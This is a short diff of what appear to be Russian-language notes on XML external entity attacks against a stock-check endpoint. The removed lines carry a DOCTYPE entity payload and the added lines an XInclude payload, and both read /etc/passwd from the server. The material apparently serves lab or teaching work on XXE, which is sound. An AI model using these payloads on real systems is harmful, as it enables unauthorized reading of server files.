@@ -1,6 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<stockCheck><productId>381</productId></stockCheck>
-Приложение не защищено от атак XXE, поэтому можно использовать уязвимость XXE для получения файла /etc/passwd, отправив следующую конструкцию XXE:
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
